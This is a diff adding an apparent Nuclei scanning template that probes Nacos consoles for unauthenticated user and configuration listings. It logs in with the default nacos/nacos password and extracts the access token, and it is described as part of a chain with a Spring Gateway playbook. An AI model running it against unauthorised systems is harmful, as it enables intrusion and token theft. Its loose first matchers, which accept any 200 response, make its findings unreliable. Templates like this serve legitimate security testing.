@@ -1,0 +1,57 @@
+id: nacos-unauth
+
+info:
+  name: Nacos 未鉴权访问 / 弱口令
+  author: survey-engine
+  severity: critical
+  description: >
+    检测 Nacos 控制台 /nacos/v1/auth/users 或配置中心未鉴权；
+    默认 nacos/nacos 弱口令；配合 Spring Gateway Playbook 完整链。
+  tags: nacos,unauth,weakpass,spring,gateway
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9"
+      - "{{BaseURL}}/nacos/v1/cs/configs?dataId=&group=&tenant=&search=accurate&pageNo=1&pageSize=10"
+      - "{{BaseURL}}/nacos"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"pageItems"'
+          - '"username"'
+          - '"dataId"'
+          - '"content"'
+          - "Nacos"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/nacos/v1/auth/users/login"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "username=nacos&password=nacos"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"accessToken"'
+          - '"tokenTtl"'
+        condition: or
+
+    extractors:
+      - type: json
+        part: body
+        name: token
+        json:
+          - ".accessToken"
